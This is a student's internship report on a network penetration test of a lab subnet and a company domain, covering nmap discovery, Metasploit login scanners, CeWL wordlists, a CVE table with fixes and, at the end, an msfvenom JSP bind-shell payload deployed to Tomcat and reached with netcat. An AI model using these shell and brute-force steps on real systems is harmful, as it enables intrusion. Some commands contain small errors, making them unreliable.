# Internship_Report

<p align="center">
  <img src="https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/032019/untitled-1_245.png?PZfG4BZ0MhiFothT02x6wcPjPrqeJsUK&itok=ye6EVwSc" alt="KNUST Logo" width="300"/>
</p>

## Network Penetration Testing

### Submitted by:
<p>Samuel Ahenkorah</p>
<p>Index Number: 7161521</p>
<p>Student number: 20865105</p>

# Table of Contents
1. [Summary](#summary)
2. [Testing_Methodogy](#TestingMethodogy)
3. [Host_Discovery](#HostDiscovery)
4. [Sevice_Discovery_and_Port_Scanning](#SeviceDiscoveryandPortScanning)
5. [vulnerabilities](#Vulnerabilities)
6. [Web-Based_Attack_Surfaces](#Web-BasedAttackSurfaces)


# Summary
An Internal Network Penetration Test was performed on a scope comprising 10.10.10.0/24 and a domain name https://virtualinfosecafrica.com/ from September 12th, 2024 to September 14th, 2024. This report describes penetration testing that represents a point in time snapshots of the network security posture of the scope in question which can be found in the subsequent sessions.

# Testing_Methodogy
Testing took off by utilizing the Network Mapper(NMAP) tool to locate live hosts and services in the in-scope ip address provided. The output of this tooling was then manually examined and the host and services were manually enumerated to uncover any missed vulnerability and weakness. Web-based attack surfaces were exploited to generate payloads.

# Host Discovery
Host discovery is a process of finding live hosts on a network. it can be used to narrow down the scope of a network assesment or during security testing. One tool which is mostly used in host discovery is the nmap tool.

__Nmap__ is an open-source command-line tool that uses ICMP, echo requests, TCP, and UDP packets to discover hosts.

When using nmap, there are some various options or arguments that are used in hoat discovery, depending on the specific tasks to be done. Some of these are;
- -sL: List scan(Simply list targets to scan)
- -sN: Ping scan(Disable port scan)
- -Pn: Treat all hosts as online(Skip host discovery), etc...

In this case, we are doing a scan report so we will use the "-sn" argument. The command used in the host discovery was " nmap -sn 10.10.10.0/24 ", where " -sn (or --ping-scan) " - tells nmap to perform a "ping scan" which is used to discover hosts without performing a full port scan. It will only check if hosts are alive, not what services they are running.
" 10.10.10.0/24 " - specifies the target network. The /24 is a CIDR notation indicating a subnet mask of 255.255.255.0, which means the scan will cover all IP addresses from 10.10.10.1 to 10.10.10.254.

![Example Image](Images/ping_scan.png)

#### For -sL scan

![List_scan](Images/list_scan.png)

#### For -Pn scan

![Bypass_scan](Images/Bypass_online.png)

The output of the nmap command includes information about hosts that are up. Tools like grep and awk are used to filter this information. To extract only the lines showing hosts that are up, you can use:

nmap -sn 10.10.10.0/24 | grep "Nmap scan report for" | awk '{print $5}'

![PSG](Images/ping_scan_grep.png)

This command sequence uses grep to find lines that indicate a host is up and also uses awk to print only the IP addresses.

To save the results to a file, redirect the output of the above command to a file. For example: 

nmap -sn 10.10.10.0/24 | grep "Nmap scan report for" | awk '{print $5}' > hosts_up.txt

![Host_up](Images/host_up.png)

This command will create (or overwrite) a file named hosts_up.txt with the list of IP addresses of hosts that are up.

You can check the contents of the file to ensure it has been written correctly by using; cat hosts_up.txt

Subdomain enumeration can also be performed using aiodnsbrute

Enumerating subdomains for https://virtualinfosecafrica.com using a wordlist located at /usr/share/wordlists/rockyou.txt. would be done by using: 

aiodnsbrute -d example.com -w /usr/share/wordlists/rockyou.txt > subdomains.txt


# Sevice Discovery and Port Scanning
Service discoveery or port scanning is the process of actively probing a target network to identify open ports and services running on them, essentially mapping out what applications and potential vulnerabilities are exposed on the system by checking which ports are actively listening for connections, thus providing valuable information for further penetration testing.

Service discovery and port scanning are essential components of network security assessments, penetration testing, and general network management

Knowing which services are running and which ports are open helps in assessing the security posture of a system. Unnecessary or outdated services can be exploited if not properly secured.

Certain services might have known vulnerabilities. By discovering these services, you can apply relevant security patches or configurations.

Ensuring that only authorized services are running is often a requirement for compliance with security standards and regulations.

To run a  service discovery scan and save to a greppable nmap file, we use the command line;

nmap -sV -oG nmap_services.txt 10.10.10.0/24

![nmap_oG](Images/nmap_oG.png)

Once you have the nmap results in greppable format, the results can be filtered by protocol by using grep.

To extract TCP services, we use:

grep "/tcp" tcp_services.txt > tcp_services_separated.txt

![grep_tcp](Images/grep_tcp.png)


# Vulnerabilities
Vulnerabilities are scan using metasploit by first running metasploit console

In the Metasploit console, we use the db_import command to import the results.

db_import /path/to/nmap_results.xml

we now search for available auxiliary modules in Metasploit that can scan for vulnerabilities based on nmap results, we use:

search type:auxiliary
using:
- use auxiliary/scanner/mysql/mysql_login,

- use auxiliary/scanner/vnc/vnc_login

- use auxiliary/scanner/rdp/rdp_login

- use auxiliary/scanner/smb/smb_login

we can scan for vulnerabilities
To use protocol-specific file created, we can use it with scanning tools in Metasploit.

First we launch msfconsole;

- msfconsole

![msconf](Images/msconf.png)

Then select an Auxiliary Module:

For example, if you want to scan mysql services for vulnerabilities:

- use auxiliary/scanner/mysql/mysql_login

![mysql](Images/mysql.png)

Set the RHOSTS Option:

Point RHOSTS to the protocol-specific file:

- set RHOSTS file:/path/to/protocol_specific_file.txt

![RHOSTS_file](Images/RHOSTS_file.png)


Run the Scan:

- run

We can develop a custom wordlist by using cewl.

CeWL (Custom Word List generator) is a tool that can be used to create a custom wordlist by crawling a website. This is particularly useful for tasks such as password cracking or fuzzing where a tailored wordlist might be more effective than a generic one. Here’s how you can use CeWL to generate a custom wordlist and describe scenarios where it would be useful.

To generate a wordlist using CeWL, the target URL is specified and various parameters are optionally configured to customize the output.

Using the command line;

#### cewl http://virtualinfosecafrica.com -w custom_wordlist.txt

Once the wordlist is generated, it can be reviewed to ensure it contains the desired entries by using;

#### cat custom_wordlist.txt

The wordlist file will be a plain text file with one word per line.

Summary of Findings

| Finding      | Severity     |
|--------------|--------------|
| Unauthenticated Remote Code Execution (RCE) | Critical |
| Denial of service (DoS) | Moderate |
| UltraVNC DSM Plugin Local Privilege Escalation | High |
| Apache Tomcat AJP File Read/Inclusion | Critical |

Detailed Findings
Unauthenticated Remote Code Execution (RCE)

| Current Rating | CVSS Score |
|----------------|------------|
| Critical | 9.8 |

Evidence
This module exploit an unauthenticated RCE vulnerability which exists in Apache version 2.4.49 (CVE-2021-41773). If files outside of the document root are not protected by ‘require all denied’ and CGI has been explicitly enabled, it can be used to execute arbitrary commands (Remote Command Execution). This vulnerability has been reintroduced in Apache 2.4.50 fix (CVE-2021-42013).

#### Affected Resources are;
  '10.10.10.2, 10.10.10.30, 10.10.10.45, 10.10.10.55'
#### Recommendations
  Update to a newer patched version of Apache HTTP Server.
  
Denial of service (DoS)

| Current Rating | CVSS Score |
|----------------|------------|
| Medium | 6.5 |

These are the vulnerabilities associated with the service version MySQL 5.6.49  with the port 3306

Evidence
CVE-2020-14765: This vulnerability exists in the FTS component of MySQL Server. It allows a low-privileged attacker with network access to cause a denial of service (DoS) by causing the MySQL Server to hang or crash. The CVSS 3.1 Base Score for this vulnerability is 6.5, indicating a medium level of severity, primarily affecting availability.

CVE-2020-14769: Found in the Optimizer component of MySQL Server, this vulnerability also allows a low-privileged attacker with network access to potentially cause a hang or crash, leading to a complete DoS of the MySQL Server. This issue also has a CVSS 3.1 Base Score of 6.5, indicating medium severity with an impact on availability.

Affected Resources:
10.10.10.5 , 10.10.10.40

Recommendations
- Rate Limiting: Implement rate limiting to control the number of requests a user can make to a service in a given timeframe. This can help mitigate the impact of DoS attacks by limiting the number of requests that can overwhelm the system.

- Traffic Filtering and Shaping: Use firewalls and intrusion prevention systems (IPS) to filter out malicious traffic. Traffic shaping can prioritize legitimate traffic and limit the impact of the attack.

- Load Balancing: Distribute incoming traffic across multiple servers or resources. This can help prevent any single server from being overwhelmed and ensure continuity of service.

UltraVNC DSM Plugin Local Privilege Escalation Vulnerability

| Current Rating | CVSS Score |
|----------------|------------|
| High | 7.8 |

It was discovered that the service version for the affected resourses which is UltraVNC 1.2.1.7 is the old version which contain vulnerabilities which could be exploited.

Evidence

CVE-2022-24750 UltraVNC is a free and open source remote pc access software. A vulnerability has been found in versions prior to 1.3.8.0 in which the DSM plugin module, which allows a local authenticated user to achieve local privilege escalation (LPE) on a vulnerable system. The vulnerability has been fixed to allow loading of plugins from the installed directory. Affected users should upgrade their UltraVNC to 1.3.8.1. Users unable to upgrade should not install and run UltraVNC server as a service. It is advisable to create a scheduled task on a low privilege account to launch WinVNC.exe instead. There are no known workarounds if winvnc needs to be started as a service.



| SERVICE VERSIONS | VULNERABILITIES: EXPLOITDB | VULNERABILITIES: MITRE CVE|
|--------------------------------------------|----------------------------|---------------------------|
| http apache httpd 2.4.49                   | ------------ |(https://www.cve.org/CVERecord?id=CVE-2021-42013).    It was found that the fix for CVE-2021-41773 in Apache HTTP Server 2.4.50 was insufficient. An attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.
| ssl/http apache httpd 2.4.49               | ------------ |(https://www.cve.org/CVERecord?id=CVE-2021-34798).  Malformed requests may cause the server to dereference a NULL pointer. This issue affects Apache HTTP Server 2.4.48 and earlier.
| mysql MySQL 5.6.49                         | ------------ |(https://www.cve.org/CVERecord?id=CVE-2020-14867)   Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server.
| vnc RealVNC 5.3.2                          | ------------ |(https://www.cve.org/CVERecord?id=CVE-2022-41975) . RealVNC VNC Server before 6.11.0 and VNC Viewer before 6.22.826 on Windows allow local privilege escalation via MSI installer Repair mode.
| rdp Microsoft Terminal Services            | ------------ |(https://www.cve.org/CVERecord?id=CVE-2014-0296).  The Remote Desktop Protocol (RDP) implementation in Microsoft Windows 7 SP1, Windows 8, Windows 8.1, and Windows Server 2012 Gold and R2 does not properly encrypt sessions, which makes it easier for man-in-the-middle attackers to obtain sensitive information by sniffing the network or modify session content by sending crafted RDP packets, aka "RDP MAC Vulnerability."
| smtp Exim smtpd 4.92                       | ------------ |(https://www.cve.org/CVERecord?id=CVE-2023-51766).  Exim before 4.97.1 allows SMTP smuggling in certain PIPELINING/CHUNKING configurations. Remote attackers can use a published exploitation technique to inject e-mail messages with a spoofed MAIL FROM address, allowing bypass of an SPF protection mechanism. This occurs because Exim supports <LF>.<CR><LF> but some other popular e-mail servers do not.
| telnet BSD telnetd                         | https://www.exploit-db.com/exploits/21018  https://www.exploit-db.com/exploits/19520  https://www.exploit-db.com/exploits/409                     |(https://www.cve.org/CVERecord?id=CVE-2011-4862).  Buffer overflow in libtelnet/encrypt.c in telnetd in FreeBSD 7.3 through 9.0, MIT Kerberos Version 5 Applications (aka krb5-appl) 1.0.2 and earlier, Heimdal 1.5.1 and earlier, GNU inetutils, and possibly other products allows remote attackers to execute arbitrary code via a long encryption key, as exploited in the wild in December 2011.
| netbios-ssn Samba 3.6.25                   | ------------ |(https://www.cve.org/CVERecord?id=CVE-2015-0240).  The Netlogon server implementation in smbd in Samba 3.5.x and 3.6.x before 3.6.25, 4.0.x before 4.0.25, 4.1.x before 4.1.17, and 4.2.x before 4.2.0rc5 performs a free operation on an uninitialized stack pointer, which allows remote attackers to execute arbitrary code via crafted Netlogon packets that use the ServerPasswordSet RPC API, as demonstrated by packets reaching the _netr_ServerPasswordSet function in rpc_server/netlogon/srv_netlog_nt.c.
| microsoft-ds Windows 7 - Samba file sharing| ------------ |(https://www.cve.org/CVERecord?id=CVE-2007-2407).  The Samba server on Apple Mac OS X 10.3.9 and 10.4.10, when Windows file sharing is enabled, does not enforce disk quotas after dropping privileges, which allows remote authenticated users to use disk space in excess of quota.
| mysql MySQL 5.5.62                         | ------------ |------------------| 
| vnc UltraVNC 1.2.1.7                       | ------------ |(https://www.cve.org/CVERecord?id=CVE-2019-8280)  UltraVNC revision 1203 has out-of-bounds access vulnerability in VNC client inside RAW decoder, which can potentially result code execution. This attack appear to be exploitable via network connectivity. This vulnerability has been fixed in revision 1204.


# Web-Based Attack Surfaces
Web-based attacks exploit vulnerabilities in web applications to gain unauthorized access, steal data, or disrupt services. Common attack types include SQL Injection, XSS, CSRF, File Inclusion, Command Injection, Broken Authentication, Directory Traversal, Security Misconfiguration, Insecure Deserialization, and SSRF. To protect against these attacks, employ secure coding practices, input validation, proper authentication mechanisms, and regularly update and configure your web applications and servers.

To use eyewitness to take screenshots  of web severs including those running on non-standard HTTP/HTTPS ports, we use the following command:

eyewitness -f hosts.txt --web --resolve --ports 80,443.8080,8443

#### Generating Payloads
To use msfvenom to generate a payload that can trigger TCP bind shell, we use the command line;

#### msfvenom -p java/jsp_shell_bind_tcp LPORT=4444 -f war -o bind_shell.war

We then deploy the WAR file to the Tomcat server. We can do this by accessing the Tomcat Manager interface and uploading the bind_shell.war file.
Now we can access the bind shell by connecting to the specified port on the target machine. For example, if you set the port to 4444, you can use netcat to connect:

#### nc 10.10.10.55 4444

![web_attack-surfaces_1](Images/web_attack-surfaces_1.png)

![WBAS](Images/WBAS.png)
